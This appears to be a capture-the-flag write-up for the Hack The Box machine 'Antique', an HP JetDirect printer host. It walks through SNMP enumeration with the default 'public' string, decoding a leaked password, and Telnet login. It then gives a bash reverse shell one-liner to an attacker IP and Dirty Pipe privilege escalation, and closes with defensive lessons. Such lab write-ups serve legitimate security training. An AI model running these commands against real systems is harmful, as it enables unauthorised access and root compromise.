# Antique
**Difficulty:** Easy | **OS:** Linux | **IP:** _10.129.74.177_

## Summary
Antique is an easy-difficulty Linux machine centered around an embedded HP JetDirect printer service. Initial reconnaissance reveals open Telnet and SNMP ports. By performing SNMP enumeration using _snmpwalk_, we extract a hex-encoded string containing cleartext credentials. Using these credentials, we authenticate via Telnet to gain initial access and establish a reverse shell. Privilege escalation is achieved by leveraging Dirty Pipe (**CVE-2022-0847**) to obtain full `root` privileges.

## Reconnaissance

### Port Scanning (Nmap)

We begin by scanning open TCP ports on the target host:

- **23:** Telnet (HP JetDirect print server interface)

Next, we run a UDP scan targeting the top 100 ports:

```nmap -sU --top-ports 100 -n -Pn -vvv --open 10.129.74.177```

- **161**: SNMP (Simple Network Management Protocol)

### Service Identification

Connecting to Telnet identifies the service as an **HP JetDirect** print server component:

```telnet 10.129.74.177 23```

## Exploitation (User Flag)

### SNMP Enumeration
Since port 161 (SNMP) is open with the default community string `public`, we walk the SNMP tree to extract information:

```snmpwalk -c public -v2c 10.129.74.177 1```

Among the results, we locate an OID output returning `iso.3.6.1.2.1 = STRING: "HTB Printer"` alongside a hex-encoded string containing stored configuration data:

```50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33 ...```

### Decoding Credentials
We convert the hex string to ASCII to recover the password:

```echo "50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 33" | xargs | xxd -ps -r```

**Extracted Password:** P@ssw0rd@123!!123

### Initial Access & Shell Stabilization

Using the recovered credentials, we log in via Telnet and execute a reverse shell to connect back to our listener:

```
# On target Telnet prompt
bash -c "bash -i >& /dev/tcp/10.10.15.97/443 0>&1"
```

We stabilize our interactive terminal:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
reset xterm
```

With an interactive shell established, we read the `user.txt` flag.

## Privilege Escalation (Root Flag)

### Vulnerability Identification (CVE-2022-0847)

System enumeration reveals that the underlying Linux kernel is vulnerable to **Dirty Pipe (CVE-2022-0847)**, an arbitrary file overwrite vulnerability in Linux kernel versions 5.8+.

### Kernel Exploitation
1) We transfer a Dirty Pipe exploit implementation to the target's `/tmp` directory.
2) We compile and execute the exploit to overwrite privileged binary permissions or patch system files.

```
cd /tmp
./dirtypipe
```

Upon execution, elevated privileges are granted, allowing us to spawn a root shell and retrieve the `root.txt` flag.

## Conclusions & Key Lessons

- **SNMP Community Strings:** Default SNMP community strings like `public` or `private` frequently leak sensitive configuration data and plaintext credentials. SNMP services should be secured or restricted via firewall rules.
- **Kernel Patching:** Systems must be regularly updated to patched kernel versions to mitigate critical local privilege escalation flaws like Dirty Pipe (CVE-2022-0847).

